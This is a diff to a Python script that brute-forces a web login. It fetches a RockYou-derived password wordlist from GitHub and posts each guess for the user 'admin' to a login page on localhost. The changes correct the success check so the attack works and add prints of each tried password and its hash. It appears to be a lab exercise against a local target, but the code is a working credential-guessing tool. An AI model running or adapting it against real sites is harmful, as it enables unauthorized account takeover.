@@ -6,7 +6,6 @@ from hashlib import sha256
 
 def posttowebsite(url, payload):
     r = requests.post(url, data=payload)
-    print(r.text)
     return r.text
 
 def readwordlist(url): #get an online wordlist
@@ -31,11 +30,12 @@ def check_password(username, salt, word, url):
     verify = hash_pword(salt.encode('utf-8'), word)
     payload = {
         'uname': username,
-        'pword': verify
+        'pword': word
     }
-    if posttowebsite(url, payload) != ' ':
-        return True
-    return True #needs to be false
+    print('word is: ', word, 'hash is: ', verify)
+    if 'Login Failed' in posttowebsite(url, payload):
+        return False #did not find
+    return True 
 
 def bruteforce(wordlist, username, url): #actually bruteforce
     counter = 0
@@ -51,19 +51,23 @@ def bruteforce(wordlist, username, url): #actually bruteforce
 
     
 ############# append the below code ################ 
+print("hello")
 
 #Set up the wordlist
-url = 'https://raw.githubusercontent.com/josuamarcelc/common-password-list/main/rockyou.txt/rockyou_1.txt'
-wordlist = readwordlist(url).decode('UTF-8')
+#wordlisturl = 'https://raw.githubusercontent.com/josuamarcelc/common-password-list/main/rockyou.txt/rockyou_1.txt'
+wordlisturl = 'https://raw.githubusercontent.com/lilycui97/TempStorage/main/rockyousmall.txt'
+wordlist = readwordlist(wordlisturl).decode('UTF-8')
 guesspasswordlist = wordlist.split('\n')
+print("finished wordlist")
 
 #Set up the account/url
 username = 'admin'
-url = '127.0.0.1:8000/login.html'
+url = 'http://127.0.0.1:8000/login.html'
 
 #Start timer
 start = time.time()
 
+print("starting attack")
 # Running the Brute Force attack
 bruteforce(guesspasswordlist, username, url)
 
